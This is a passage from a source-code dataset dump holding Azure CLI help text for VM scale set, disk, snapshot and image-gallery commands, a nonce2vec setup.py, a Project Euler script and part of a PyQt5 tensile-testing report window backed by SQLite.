--scripts 'echo $1 $2' --parameters hello world\n\"\"\"\n\nhelps['vmss identity'] = \"\"\"\n    type: group\n    short-summary: manage service identities of a VM scaleset.\n\"\"\"\n\nhelps['vmss identity assign'] = \"\"\"\n    type: command\n    short-summary: Enable managed service identity on a VMSS.\n    long-summary: This is required to authenticate and interact with other Azure services using bearer tokens.\n    examples:\n        - name: Enable system assigned identity on a VMSS with the 'Owner' role.\n          text: az vmss identity assign -g MyResourceGroup -n MyVmss --role Owner --scope /subscriptions/db5eb68e-73e2-4fa8-b18a-0123456789999/resourceGroups/MyResourceGroup\n\"\"\"\n\nhelps['vmss identity remove'] = \"\"\"\n    type: command\n    short-summary: (PREVIEW) Remove user assigned identities from a VM scaleset.\n    examples:\n        - name: Remove system assigned identity\n          text: az vmss identity remove -g MyResourceGroup -n MyVmss\n        - name: Remove 2 identities which are in the same resource group with the VM scaleset\n          text: az vmss identity remove -g MyResourceGroup -n MyVmss --identities readerId writerId\n        - name: Remove system assigned identity and a user identity\n          text: az vmss identity remove -g MyResourceGroup -n MyVmss --identities [system] readerId\n\"\"\"\n\nhelps['vmss identity show'] = \"\"\"\n    type: command\n    short-summary: display VM scaleset's managed identity info.\n\"\"\"\n\nhelps['disk'] = \"\"\"\n    type: group\n    short-summary: Manage Azure Managed Disks.\n\"\"\"\n\nhelps['image'] = \"\"\"\n    type: group\n    short-summary: Manage custom virtual machine images.\n\"\"\"\n\nhelps['disk create'] = \"\"\"\n    type: command\n    short-summary: Create a managed disk.\n    examples:\n        - name: Create a managed disk by importing from a blob uri.\n          text: >\n            az disk create -g MyResourceGroup -n MyDisk --source https://vhd1234.blob.core.windows.net/vhds/osdisk1234.vhd\n        - name: Create an empty managed disk.\n          text: >\n            az disk create -g MyResourceGroup -n MyDisk --size-gb 10\n        - name: Create a managed disk by copying an existing disk or snapshot.\n          text: >\n            az disk create -g MyResourceGroup -n MyDisk2 --source MyDisk\n        - name: Create a disk in an availability zone in the region of \"East US 2\"\n          text: >\n            az disk create -n MyDisk -g MyResourceGroup --size-gb 10 --location eastus2 --zone 1\n\"\"\"\n\nhelps['disk list'] = \"\"\"\n    type: command\n    short-summary: List managed disks.\n\"\"\"\n\nhelps['disk delete'] = \"\"\"\n    type: command\n    short-summary: Delete a managed disk.\n\"\"\"\n\nhelps['disk update'] = \"\"\"\n    type: command\n    short-summary: Update a managed disk.\n\"\"\"\n\nhelps['disk wait'] = \"\"\"\n    type: command\n    short-summary: Place the CLI in a waiting state until a condition of a managed disk is met.\n\"\"\"\n\n\nhelps['disk grant-access'] = \"\"\"\n    type: command\n    short-summary: Grant a resource read access to a managed disk.\n\"\"\"\n\nhelps['disk revoke-access'] = \"\"\"\n    type: command\n    short-summary: Revoke a resource's read access to a managed disk.\n\"\"\"\n\nhelps['snapshot'] = \"\"\"\n    type: group\n    short-summary: Manage point-in-time copies of managed disks, native blobs, or other snapshots.\n\"\"\"\n\nhelps['snapshot create'] = \"\"\"\n    type: command\n    short-summary: Create a snapshot.\n    examples:\n        - name: Create a snapshot by importing from a blob uri.\n          text: >\n            az snapshot create -g MyResourceGroup -n MySnapshot --source https://vhd1234.blob.core.windows.net/vhds/osdisk1234.vhd\n        - name: Create an empty snapshot.\n          text: az snapshot create -g MyResourceGroup -n MySnapshot --size-gb 10\n        - name: Create a snapshot by copying an existing disk in the same resource group.\n          text: az snapshot create -g MyResourceGroup -n MySnapshot2 --source MyDisk\n\"\"\"\n\nhelps['snapshot update'] = \"\"\"\n    type: command\n    short-summary: Update a snapshot.\n\"\"\"\n\nhelps['snapshot list'] = \"\"\"\n    type: command\n    short-summary: List snapshots.\n\"\"\"\n\nhelps['snapshot grant-access'] = \"\"\"\n    type: command\n    short-summary: Grant read access to a snapshot.\n\"\"\"\n\nhelps['snapshot revoke-access'] = \"\"\"\n    type: command\n    short-summary: Revoke read access to a snapshot.\n\"\"\"\n\nhelps['snapshot wait'] = \"\"\"\n    type: command\n    short-summary: Place the CLI in a waiting state until a condition of a snapshot is met.\n\"\"\"\n\nhelps['image create'] = \"\"\"\n    type: command\n    short-summary: Create a custom Virtual Machine Image from managed disks or snapshots.\n    examples:\n        - name: Create an image from an existing disk.\n          text: |\n            az image create -g MyResourceGroup -n image1 --os-type Linux \\\\\n                --source /subscriptions/db5eb68e-73e2-4fa8-b18a-0123456789999/resourceGroups/rg1/providers/Microsoft.Compute/snapshots/s1\n        - name: Create an image by capturing an existing generalized virtual machine in the same resource group.\n          text: az image create -g MyResourceGroup -n image1 --source MyVm1\n\"\"\"\n\nhelps['image list'] = \"\"\"\n    type: command\n    short-summary: List custom VM images.\n\"\"\"\n\nhelps['identity'] = \"\"\"\n    type: group\n    short-summary: Managed Service Identities\n\"\"\"\n\nhelps['identity list'] = \"\"\"\n    type: command\n    short-summary: List Managed Service Identities\n\"\"\"\n\nhelps['identity list-operations'] = \"\"\"\n    type: command\n    short-summary: Lists available operations for the Managed Identity provider\n\"\"\"\n\nhelps['sig'] = \"\"\"\n    type: group\n    short-summary: manage shared image gallery\n\"\"\"\n\nhelps['sig create'] = \"\"\"\n    type: command\n    short-summary: create a share image gallery.\n\"\"\"\n\nhelps['sig list'] = \"\"\"\n    type: command\n    short-summary: list share image galleries.\n\"\"\"\n\nhelps['sig update'] = \"\"\"\n    type: command\n    short-summary: update a share image gallery.\n\"\"\"\n\nhelps['sig image-definition'] = \"\"\"\n    type: group\n    short-summary: create an image definition\n\"\"\"\n\nhelps['sig image-definition create'] = \"\"\"\n    type: command\n    short-summary: create a gallery image definition\n    examples:\n        - name: Create a linux image defintion\n          text: |\n            az sig image-definition create -g MyResourceGroup --gallery-name MyGallery --gallery-image-definition MyImage --publisher GreatPublisher --offer GreatOffer --sku GreatSku --os-type linux\n\"\"\"\n\nhelps['sig image-definition update'] = \"\"\"\n    type: command\n    short-summary: update a share image defintiion.\n\"\"\"\n\nhelps['sig image-version'] = \"\"\"\n    type: group\n    short-summary: create a new version from an image defintion\n\"\"\"\n\nhelps['sig image-version create'] = \"\"\"\n    type: command\n    short-summary: creat a new image version\n    long-summary : this operation might take a long time depending on the replicate region number. Use \"--no-wait\" is advised.\n    examples:\n        - name: Add a new image version\n          text: |\n            az sig image-version create -g MyResourceGroup --gallery-name MyGallery --gallery-image-definition MyImage --gallery-image-version 1.0.0 --managed-image /subscriptions/00000000-0000-0000-0000-00000000xxxx/resourceGroups/imageGroups/providers/images/MyManagedImage\n        - name: Add a new image version replicated across multiple regions with different replication counts each. Eastus2 will have it's replica count set to the default replica count.\n          text: |\n                az sig image-version create -g MyResourceGroup --gallery-name MyGallery \\\\\n                --gallery-image-definition MyImage --gallery-image-version 1.0.0 \\\\\n                --managed-image image-name --target-regions eastus2 ukwest=3 southindia=2\n        - name: Add a new image version and don't wait on it. Later you can invoke \"az sig image-version wait\" command when ready to create a vm from the gallery image version\n          text: |\n            az sig image-version create --no-wait -g MyResourceGroup --gallery-name MyGallery \\\\\n            --gallery-image-definition MyImage --gallery-image-version 1.0.0 \\\\\n            --managed-image imageInTheSameResourceGroup\n\"\"\"\n\nhelps['sig image-version update'] = \"\"\"\n    type: command\n    short-summary: update a share image version\n    examples:\n        - name: Replicate to a new set of regions\n          text: |\n            az sig image-version update -g MyResourceGroup --gallery-name MyGallery --gallery-image-definition MyImage --gallery-image-version 1.0.0 --target-regions westcentralus=2 eastus2\n        - name: Replicate to one more region\n          text: |\n            az sig image-version update -g MyResourceGroup --gallery-name MyGallery --gallery-image-definition MyImage --gallery-image-version 1.0.0 --add publishingProfile.targetRegions name=westcentralus\n\n\"\"\"\n\nhelps['sig image-version wait'] = \"\"\"\n    type: command\n    short-summary: wait for image version related operation\n    examples:\n        - name: wait for an image version gets updated\n          text: |\n            az sig image-version wait --updated -g MyResourceGroup --gallery-name MyGallery --gallery-image-definition MyImage --gallery-image-version 1.0.0\n\"\"\"\n"}
{"blob_id": "07f5b6e825f41b3d2981885837b11dd11464e4c4", "directory_id": "5cf9fb9362559a69a3feb2e572c1089fbfd9dc24", "path": "/setup.py", "content_id": "11bf68236d6f20392396504839453e5c5e3c99f7", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "akb89/nonce2vec", "snapshot_id": "5f42943271a0054caa645d91c75e0f9cf6eacefe", "revision_id": "23d3852904eb337d7ca24ea519463ee9ffa50fa5", "branch_name": "refs/heads/master", "visit_date": "2021-06-21 23:17:42.035144", "revision_date": "2019-07-29 11:53:25", "committer_date": "2019-07-29 11:53:25", "github_id": "129858554", "star_events_count": "4", "fork_events_count": "1", "gha_license_id": "MIT", "gha_event_created_at": "2019-07-29 11:53:26", "gha_created_at": "2018-04-17 06:42:39", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2006", "extension": "py", "content": "#!/usr/bin/env python3\n\"\"\"nonce2vec setup.py.\n\nThis file details modalities for packaging the nonce2vec application.\n\"\"\"\n\nfrom setuptools import setup\n\nwith open('README.md', 'r') as fh:\n    long_description = fh.read()\n\nsetup(\n    name='nonce2vec',\n    description='A python module to generate word embeddings from tiny data',\n    author=' Alexandre Kabbach and Aur\u00e9lie Herbelot',\n    author_email='akb@3azouz.net',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    version='2.0.0',\n    url='https://github.com/minimalparts/nonce2vec',\n    download_url='https://github.com/minimalparts/nonce2vec/#files',\n    license='MIT',\n    keywords=['word2vec', 'word-embeddings', 'incremental-learning'],\n    platforms=['any'],\n    packages=['nonce2vec', 'nonce2vec.utils', 'nonce2vec.models',\n              'nonce2vec.exceptions', 'nonce2vec.logging',\n              'nonce2vec.resources'],\n    package_data={'nonce2vec': ['logging/*.yml', 'resources/*']},\n    include_package_data=True,\n    entry_points={\n        'console_scripts': [\n            'n2v = nonce2vec.main:main'\n        ],\n    },\n    install_requires=['pyyaml>=4.2b1', 'gensim==3.4.0', 'numpy==1.15.4',\n                      'scipy==1.2.0'],\n    classifiers=['Development Status :: 2 - Pre-Alpha',\n                 'Environment :: Web Environment',\n                 'Intended Audience :: Developers',\n                 'Intended Audience :: Education',\n                 'Intended Audience :: Science/Research',\n                 'License :: OSI Approved :: MIT License',\n                 'Natural Language :: English',\n                 'Operating System :: OS Independent',\n                 'Programming Language :: Python :: 3.5',\n                 'Programming Language :: Python :: 3.6',\n                 'Programming Language :: Python :: 3.7',\n                 'Topic :: Scientific/Engineering :: Artificial Intelligence',\n                 'Topic :: Text Processing :: Linguistic'],\n    zip_safe=False,\n)\n"}
{"blob_id": "d4741349d4ef0f876535e394b0a8e5ccf06babd8", "directory_id": "c3e0ad4e92041b1daacfc370fc23760d2b8605b9", "path": "/p76.py", "content_id": "dccfc63592e3b135acfec3986c90590f1509f356", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "tsong/project-euler", "snapshot_id": "19440ceeedb1f515b27f681a956b6ebcdbe1146b", "revision_id": "77ad387354785521af540edba824593c4fe1099a", "branch_name": "refs/heads/master", "visit_date": "2021-01-10 20:33:54.706060", "revision_date": "2011-07-01 21:29:24", "committer_date": "2011-07-01 21:29:24", "github_id": "1646743", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "141", "extension": "py", "content": "def count(n,m):\n\tif n <= 1:\n\t\treturn 1\n\n\ts = 1\n\tfor i in xrange(1,n/2+1):\n\t\tif i >= m:\n\t\t\ts += count(n-i, i)\n\treturn s\n\nprint count(100,1)-1\n"}
{"blob_id": "3cbe850887808dfaf2d2e3096c804e2335696bb5", "directory_id": "556357a07c95176d8aa260795eb99b15970a1135", "path": "/AE/TY_06_REPORT_PART_2.py", "content_id": "f5f3618610c62d4d81891a755b503c33c3f2e628", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "sanjaymanegit/testRepo", "snapshot_id": "db11ba5d02d47b78f6c9762c9a0628b22946e446", "revision_id": "92a02cbe0add7d14b751b79e612e85a062e37498", "branch_name": "refs/heads/master", "visit_date": "2023-09-02 07:46:35.164047", "revision_date": "2023-08-29 12:53:49", "committer_date": "2023-08-29 12:53:49", "github_id": "42922622", "star_events_count": "1", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "2023-04-16 18:45:53", "gha_created_at": "2015-09-22 08:53:13", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "75157", "extension": "py", "content": "# -*- coding: utf-8 -*-\n# Form implementation generated from reading ui file 'TY_06_REPORT_PART_2.ui'\n#\n# Created by: PyQt5 UI code generator 5.12.3\n#\n# WARNING! All changes made in this file will be lost!\n\n\nfrom PyQt5 import QtCore, QtGui, QtWidgets\nfrom PyQt5.Qt import QTableWidgetItem\n\nimport sqlite3\n\nclass TY_06_Ui_MainWindow(object):\n    def setupUi(self, MainWindow):\n        MainWindow.setObjectName(\"MainWindow\")\n        MainWindow.resize(1366, 768)\n        MainWindow.setBaseSize(QtCore.QSize(15, 11))\n        self.centralwidget = QtWidgets.QWidget(MainWindow)\n        self.centralwidget.setObjectName(\"centralwidget\")\n        self.frame = QtWidgets.QFrame(self.centralwidget)\n        self.frame.setGeometry(QtCore.QRect(30, 30, 1331, 705))\n        self.frame.setStyleSheet(\"background-color: rgb(215, 255, 252);\")\n        '''\n        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)\n        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)\n        '''\n        self.frame.setFrameShape(QtWidgets.QFrame.Box)\n        self.frame.setFrameShadow(QtWidgets.QFrame.Plain)\n        self.frame.setLineWidth(3)\n        #self.frame.setStyleSheet(\"background-color: rgb(221, 255, 234);\")\n        self.frame.setObjectName(\"frame\")\n        \n        self.shape=\"\"       \n        self.unit_typex=\"\"\n        self.lastIndex=13\n        self.shear_mod_ip=\"\"\n        \n        self.label_6 = QtWidgets.QLabel(self.frame)\n        self.label_6.setGeometry(QtCore.QRect(540, 30, 211, 41))\n        font = QtGui.QFont()\n        font.setFamily(\"MS Sans Serif\")\n        font.setPointSize(16)\n        self.label_6.setFont(font)\n        self.label_6.setStyleSheet(\"color: rgb(0, 85, 255);\")\n        self.label_6.setAlignment(QtCore.Qt.AlignCenter)\n        self.label_6.setObjectName(\"label_6\")\n        \n        self.label_6_1 = QtWidgets.QLabel(self.frame)\n        self.label_6_1.setGeometry(QtCore.QRect(840, 30, 351, 41))\n        font = QtGui.QFont()\n        font.setFamily(\"MS Sans Serif\")\n        font.setPointSize(10)\n        self.label_6_1.setFont(font)\n        #self.label_6.setStyleSheet(\"color: rgb(0, 85, 255);\")\n        self.label_6_1.setAlignment(QtCore.Qt.AlignCenter)\n        self.label_6_1.setObjectName(\"label_6_1\")\n        \n        \n        self.pushButton_14 = QtWidgets.QPushButton(self.frame)\n        self.pushButton_14.setGeometry(QtCore.QRect(570, 600, 131, 41))\n        font = QtGui.QFont()\n        font.setFamily(\"MS Sans Serif\")\n        font.setPointSize(10)\n        self.pushButton_14.setFont(font)\n        self.pushButton_14.setObjectName(\"pushButton_14\")\n        self.tableWidget = QtWidgets.QTableWidget(self.frame)\n        font = QtGui.QFont()\n        font.setPointSize(10)\n        self.tableWidget.setFont(font)\n        self.tableWidget.setGeometry(QtCore.QRect(20, 111, 1291, 411))\n        self.tableWidget.setObjectName(\"tableWidget\")\n        #self.tableWidget.setStyleSheet(\"background-color: rgb(221, 255, 234);\")\n        self.tableWidget.setColumnCount(0)\n        self.tableWidget.setRowCount(0)\n        '''\n        self.tableWidget_2 = QtWidgets.QTableWidget(self.frame)\n        self.tableWidget_2.setGeometry(QtCore.QRect(670, 110, 641, 411))\n        self.tableWidget_2.setObjectName(\"tableWidget_2\")\n        self.tableWidget_2.setColumnCount(0)\n        self.tableWidget_2.setRowCount(0)\n        '''\n        MainWindow.setCentralWidget(self.centralwidget)\n        self.menubar = QtWidgets.QMenuBar(MainWindow)\n        self.menubar.setGeometry(QtCore.QRect(0, 0, 1366, 21))\n        self.menubar.setObjectName(\"menubar\")\n        MainWindow.setMenuBar(self.menubar)\n        self.statusbar = QtWidgets.QStatusBar(MainWindow)\n        self.statusbar.setObjectName(\"statusbar\")\n        MainWindow.setStatusBar(self.statusbar)\n        self.test_type=\"\"\n        self.def_flg=\"\"\n        self.retranslateUi(MainWindow)\n        QtCore.QMetaObject.connectSlotsByName(MainWindow)\n\n    def retranslateUi(self, MainWindow):\n        _translate = QtCore.QCoreApplication.translate\n        MainWindow.setWindowTitle(_translate(\"MainWindow\", \"MainWindow\"))\n        self.label_6.setText(_translate(\"MainWindow\", \"Report Part II\")) \n        self.label_6_1.setText(_translate(\"MainWindow\", \" [ Test Id: 265 ]    [ Batch Id : 3452321qwe ] \"))\n        self.pushButton_14.setText(_translate(\"MainWindow\", \"Return\"))\n        self.pushButton_14.clicked.connect(MainWindow.close)\n        self.def_flg=\"\"\n        #self.select_all_rows_2()\n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT TEST_ID,BATCH_ID,TEST_TYPE,DEF_FLG FROM TEST_MST WHERE TEST_ID IN (SELECT NEW_REPORT_TEST_ID FROM GLOBAL_VAR)\") \n        for x in results:           \n            self.label_6_1.setText(\"[ Test Id: \"+str(x[0])+\" ]              [ Batch Id:\"+str(x[1])+\" ]\")\n            self.test_type=str(x[2])\n            self.def_flg=str(x[3])\n        connection.close()\n        \n        if(self.test_type==\"Compress\"):\n            self.select_all_rows_compress()\n        elif(self.test_type==\"Tear\"):\n            self.select_all_rows_tear()\n        elif(self.test_type==\"Flexural\"):\n            self.select_all_rows_flexural()\n        elif(self.test_type==\"QLSS\"):\n            self.select_all_rows_qlss()\n        elif(self.test_type==\"ILSS\"):\n            self.select_all_rows_ilss()\n        elif(self.test_type==\"COF\"):\n            self.select_all_rows_cof()\n        else:\n            if(self.def_flg==\"Y\"):\n                 self.guage_select_all_rows()\n            else:\n                 self.select_all_rows()\n    \n    def delete_all_records(self):\n        i = self.tableWidget.rowCount()       \n        while (i>0):             \n            i=i-1\n            self.tableWidget.removeRow(i)       \n            \n    def select_all_rows(self):\n        self.delete_all_records()    \n        self.tableWidget.setMidLineWidth(-4)\n        self.tableWidget.setGridStyle(QtCore.Qt.SolidLine)\n        self.tableWidget.setObjectName(\"tableWidget\")\n        self.tableWidget.setColumnCount(14)\n        font = QtGui.QFont()\n        font.setPointSize(10)\n        self.tableWidget.setFont(font)\n        self.tableWidget.horizontalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        self.tableWidget.verticalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        #self.tableWidget.horizontalHeader().setStyleSheet(\"::section {background-color : lightGray;font-size:10pt;}\")\n   \n        #self.tableWidget.setRowCount(1)\n        #self.tableWidget.resizeColumnsToContents()\n        #self.tableWidget.resizeRowsToContents()\n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)\n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n        self.tableWidget.setColumnWidth(0, 50)\n        self.tableWidget.setColumnWidth(1, 80)\n        self.tableWidget.setColumnWidth(2, 80)\n        self.tableWidget.setColumnWidth(3, 80)\n        self.tableWidget.setColumnWidth(4, 120)\n        self.tableWidget.setColumnWidth(5, 80)\n        self.tableWidget.setColumnWidth(6, 80)    \n        self.tableWidget.setColumnWidth(7, 120)\n        self.tableWidget.setColumnWidth(8, 80)    \n        self.tableWidget.setColumnWidth(9, 120)\n        self.tableWidget.setColumnWidth(10, 100)\n        self.tableWidget.setColumnWidth(11, 100)\n        self.tableWidget.setColumnWidth(12, 100)    \n        self.tableWidget.setColumnWidth(13, 100)\n        \n     \n        \n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT STG_GRAPH_TYPE,STG_UNIT_TYPE FROM GLOBAL_REPORTS_PARAM\") \n        for x in results:           \n            self.unit_typex=x[1]\n        connection.close()\n        \n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n           \n        # SELECT SHAPE FROM SPECIMEN_MST WHERE SPECIMEN_NAME IN ( SELECT SPECIMEN_NAME FROM TEST_MST WHERE TEST_ID IN (SELECT NEW_REPORT_TEST_ID FROM GLOBAL_VAR))\n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT SHAPE FROM SPECIMEN_MST WHERE SPECIMEN_NAME IN ( SELECT SPECIMEN_NAME FROM TEST_MST WHERE TEST_ID IN (SELECT NEW_REPORT_TEST_ID FROM GLOBAL_VAR))\") \n        for x in results:\n            self.shape=x[0]\n        connection.close()\n        #self.shape='Pipe'                                 \n        print (\"shape :\"+self.shape)        \n        if (self.shape==\"Rectangle\"):\n            if(self.unit_typex==\"Lb/Inch\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe.No.', ' Thickness \\n (Inch) ', ' Width \\n (Inch) ', 'CS.Area \\n (Inch2)','Force at Peak \\n (Lb)' ,'E@Peak \\n (Inch)','% E@Peak','E@Break \\n (Inch)','% E@Break','Tensile Strength \\n (Lb/Inch2)','Mod@100% \\n (Lb/Inch2)','Mod@200% \\n (Lb/Inch2)','Mod@300% \\n (Lb/Inch2)','Mod % (Lb/Inch2)' ])        \n            elif(self.unit_typex == \"Newton/Mm\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe.No.', ' Thickness \\n (mm) ', ' Width \\n (mm) ', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (N/Mm2)','Mod@100% \\n (N/Mm2)','Mod@200% \\n (N/Mm2)','Mod@300% \\n (N/Mm2)','Mod %'])\n            elif(self.unit_typex == \"MPA\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe.No.', ' Thickness \\n (mm) ', ' Width \\n (mm) ', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (MPA)','Mod@100% \\n (MPA)','Mod@200% \\n (MPA)','Mod@300% \\n (MPA)','Mod %'])\n            else:    \n                self.tableWidget.setHorizontalHeaderLabels(['Spe.No.', ' Thickness \\n (cm) ', ' Width \\n (cm) ', 'CS.Area \\n (cm2)','Force at Peak \\n (Kgf)' ,'E@Peak \\n (cm)','% E@Peak','E@Break \\n (cm)','% E@Break','Tensile Strength \\n (Kgf/Cm2)','Mod@100% \\n (Kgf/Cm2)','Mod@200% \\n (Kgf/Cm2)','Mod@300% \\n (Kgf/Cm2)','Mod %'])        \n        \n        \n            \n        elif (self.shape==\"Cylindrical\"):     \n            self.tableWidget.setColumnCount(13)\n            self.lastIndex=12\n            if(self.unit_typex==\"Lb/Inch\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Diameter \\n (Inch)', 'CS.Area \\n (Inch2)','Force at Peak \\n (Lb)' ,'E@Peak \\n (Inch)','% E@Peak','E@Break \\n (Inch)','% E@Break','Tensile Strength \\n (Lb/Inch2)','Mod@100% \\n (Lb/Inch2)','Mod@200% \\n (Lb/Inch2)','Mod@300% \\n (Lb/Inch2)','Mod % (Lb/Inch2)'])\n            elif(self.unit_typex == \"Newton/Mm\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Diameter \\n (mm)', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (N/Mm2)','Mod@100% \\n (N/Mm2)','Mod@200% \\n (N/Mm2)','Mod@300% \\n (N/Mm2)','Mod %'])\n            elif(self.unit_typex == \"MPA\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Diameter \\n (mm)', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (MPA)','Mod@100% \\n (MPA)','Mod@200% \\n (MPA)','Mod@300% \\n (MPA)','Mod %'])\n            else: \n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Diameter \\n (cm)', 'CS.Area \\n (cm2)','Force at Peak \\n (Kg)' ,'E@Peak \\n (cm)','% E@Peak','E@Break \\n (cm)','% E@Break','Tensile Strength \\n (Kg/Cm2)','Mod@100% \\n (Kg/Cm2)','Mod@200% \\n (Kg/Cm2)','Mod@300% \\n (Kg/Cm2)','Mod %'])\n        \n        elif (self.shape==\"Pipe\"):            \n            self.tableWidget.setColumnCount(14)\n            self.lastIndex=13\n            if(self.unit_typex==\"Lb/Inch\"):\n               self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Inn.Diameter \\n (Inch)', 'Out. Diameter \\n (Inch)', 'CS.Area \\n (Inch2)','Force at Peak \\n (Lb)' ,'E@Peak \\n (Inch)','% E@Peak','E@Break \\n (Inch)','% E@Break','Tensile Strength \\n (Lb/Inch2)','Mod@100% \\n (Lb/Inch2)','Mod@200% \\n (Lb/Inch2)','Mod@300% \\n (Lb/Inch2)','Mod % (Lb/Inch2)'])\n            elif(self.unit_typex == \"Newton/Mm\"):\n               self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Inn.Diameter \\n (Inch)', 'Out. Diameter \\n (Inch)', 'CS.Area \\n (Inch2)','Force at Peak \\n (N)' ,'E@Peak \\n (Inch)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (N/Mm2)','Mod@100% \\n (N/Mm2)','Mod@200% \\n (N/Mm2)','Mod@300% \\n (N/Mm2)','Mod %']) \n            elif(self.unit_typex == \"MPA\"):\n               self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Inn.Diameter \\n (mm)', 'Out. Diameter \\n (mm)', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (MPA)','Mod@100% \\n (MPA)','Mod@200% \\n (MPA)','Mod@300% \\n (MPA)','Mod %']) \n            else:\n               self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Inn.Diameter \\n (cm)', 'Out. Diameter \\n (cm)', 'CS.Area \\n (cm2)','Force at Peak \\n (Kgf)' ,'E@Peak \\n (cm)','% E@Peak','E@Break \\n (cm)','% E@Break','Tensile Strength \\n (Kgf/Cm2)','Mod@100% \\n (Kgf/Cm2)','Mod@200% \\n (Kgf/Cm2)','Mod@300% \\n (Kgf/Cm2)','Mod %'])\n        elif (self.shape==\"DirectValue\"): \n            self.tableWidget.setColumnCount(12)\n            self.lastIndex=11\n            if(self.unit_typex==\"Lb/Inch\"):\n                #print(\"header\")\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'CS.Area \\n (Inch2)','Force at Peak \\n (Lb)' ,'E@Peak \\n (Inch)','% E@Peak','E@Break \\n (Inch)','% E@Break','Tensile Strength \\n (Lb/Inch2)','Mod@100% \\n (Lb/Inch2)','Mod@200% \\n (Lb/Inch2)','Mod@300% \\n (Lb/Inch2)','Mod %'])           \n            elif(self.unit_typex == \"Newton/Mm\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (N/Mm2)','Mod@100% \\n (N/Mm2)','Mod@200% \\n (N/Mm2)','Mod@300% \\n (N/Mm2)','Mod %'])\n            elif(self.unit_typex == \"MPA\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (MPA)','Mod@100% \\n (MPA)','Mod@200% \\n (MPA)','Mod@300% \\n (MPA)','Mod %'])\n            else:   \n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'CS.Area \\n (cm2)','Force at Peak \\n (Kg)' ,'E@Peak \\n (cm)','% E@Peak','E@Break \\n (cm)','% E@Break','Tensile Strength \\n (Kg/Cm2)','Mod@100% \\n (Kg/Cm2)','Mod@200% \\n (Kg/Cm2)','Mod@300% \\n (Kg/Cm2)','Mod %'])           \n        else:\n           self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Thickness \\n (mm)', 'Width \\n (mm)', 'CS.Area \\n (mm2)','Force at Peak \\n (kg)' ,'% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (Kg/Cm2)','Mod@100% \\n (Kg/Cm2)','Mod@200% \\n (Kg/Cm2)','Mod@300% \\n (Kg/Cm2)','Mod %'])\n       \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT MOD_AT_ANY FROM REPORT_MST WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")                        \n        for rows in results:\n                print(\" self.lastIndex :\"+str(self.lastIndex))\n                item = self.tableWidget.horizontalHeaderItem(self.lastIndex)\n                if(self.unit_typex==\"Lb/Inch\"):\n                    item.setText(\"Mod@\"+str(rows[0])+\"% \\n (Lb/Inch2)\")\n                elif(self.unit_typex == \"Newton/Mm\"):\n                    item.setText(\"Mod@\"+str(rows[0])+\"% \\n (N/Mm2)\")                    \n                elif(self.unit_typex == \"MPA\"):\n                    item.setText(\"Mod@\"+str(rows[0])+\"% \\n (MPA)\")    \n                else: \n                    item.setText(\"Mod@\"+str(rows[0])+\"% \\n (Kgf/Cm2)\")   \n             \n        connection = sqlite3.connect(\"tyr.db\")\n        print(\"shape : \"+str(self.shape))\n        if 